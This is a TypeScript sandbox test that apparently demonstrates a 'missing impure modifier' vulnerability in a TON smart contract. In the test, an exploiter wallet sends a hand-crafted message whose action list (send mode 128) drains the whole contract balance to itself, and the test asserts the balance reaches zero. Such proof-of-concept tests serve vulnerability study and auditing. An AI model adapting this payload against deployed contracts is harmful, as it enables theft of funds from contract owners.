import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
import { beginCell, Cell, toNano } from '@ton/core';
import { MissingImpure } from '../wrappers/MissingImpure';
import '@ton/test-utils';
import { compile } from '@ton/blueprint';

describe('MissingImpure', () => {
    let code: Cell;

    beforeAll(async () => {
        code = await compile('MissingImpure');
    });

    let blockchain: Blockchain;
    let owner1: SandboxContract<TreasuryContract>;
    let owner2: SandboxContract<TreasuryContract>;
    let exploiter: SandboxContract<TreasuryContract>;
    let missingImpure: SandboxContract<MissingImpure>;
    let initBalance: bigint;

    beforeEach(async () => {
        initBalance = toNano('100');
        blockchain = await Blockchain.create();

        owner1 = await blockchain.treasury('owner1');
        owner2 = await blockchain.treasury('owner2');
        exploiter = await blockchain.treasury('exploiter');

        missingImpure = blockchain.openContract(
            MissingImpure.createFromConfig({ owner1: owner1.address, owner2: owner2.address }, code),
        );

        const deployResult = await missingImpure.sendDeploy(owner1.getSender(), initBalance);

        expect(deployResult.transactions).toHaveTransaction({
            from: owner1.address,
            to: missingImpure.address,
            deploy: true,
            success: true,
        });
    });

    it('Exploit Missing Impure Modifier', async () => {
        expect((await missingImpure.getBalance()) > 0n).toBe(true);
        console.log('MissingImpure balance before:', (await missingImpure.getBalance()).toString());

        const balanceExploiterBefore = await exploiter.getBalance();
        console.log('Exploiter balance before:', balanceExploiterBefore.toString());

        const body = beginCell()
            .storeRef(
                beginCell()
                    .storeRef(Cell.EMPTY)
                    .storeUint(0x0ec3c86d, 32)
                    .storeUint(128, 8)
                    .storeRef(
                        beginCell()
                            .storeUint(0x18, 6)
                            .storeAddress(exploiter.address)
                            .storeCoins(0)
                            .storeUint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
                            .endCell(),
                    ),
            )
            .endCell();

        await missingImpure.sendMessage(exploiter.getSender(), toNano('0.05'), body);

        const balanceExploiterAfter = await exploiter.getBalance();
        console.log('Exploiter balance after:', balanceExploiterAfter.toString());

        expect((await missingImpure.getBalance()) == 0n).toBe(true);
        console.log('MissingImpure balance after:', (await missingImpure.getBalance()).toString());
        expect(initBalance > balanceExploiterAfter - balanceExploiterBefore).toBe(true);
    });
});
